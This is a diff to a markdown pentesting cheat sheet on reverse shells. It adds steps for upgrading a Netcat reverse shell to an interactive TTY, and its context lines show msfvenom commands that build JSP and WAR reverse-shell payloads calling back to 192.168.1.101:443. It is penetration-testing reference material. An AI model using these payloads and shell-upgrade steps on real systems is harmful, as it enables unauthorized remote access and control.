@@ -5,6 +5,35 @@ This is s great collection of different types of reverse shells and webshells. M
 
 [http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
 
+
+## Interactive shell
+When obtaining a reverse shell with a Netcat listener, it is by default non-interactive and you cannot pass keyboard shortcuts or special characters such as tab.
+It is quite simple to work around.
+
+1 - For starters, in your shell, run
+
+    python -c 'import pty;pty.spawn("/bin/bash");'
+
+  to obtain a partially interactive bash shell.
+
+2 - After that, do CTRL+Z to background Netcat.
+3 - Enter
+``stty raw -echo
+``
+in your terminal, which will tell your terminal to pass keyboard shortcuts etc. through.
+4 - Once that is done, run the command
+``fg
+``
+to bring Netcat back to the foreground. Note you will not be able to see what you are typing in terminal after you change your stty setting. You should now have tab autocomplete as well as be able to use interactive commands such as su and nano.
+
+Summary:
+```
+python -c 'import pty;pty.spawn("/bin/bash");'
+CTRL+Z
+stty raw -echo
+fg
+```
+
 ## Msfvenom
 
 There is an important difference between non-staged and staged payload. A **non-staged** shell is sent over in one block. You just send shell in one stage. This can be caught with metasploit multi-handler. But also with netcat.
@@ -206,6 +235,3 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.101 LPORT=443 -f war > sh
 ```
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.101 LPORT=443 -f raw > shell.jsp
 ```
-
-
-
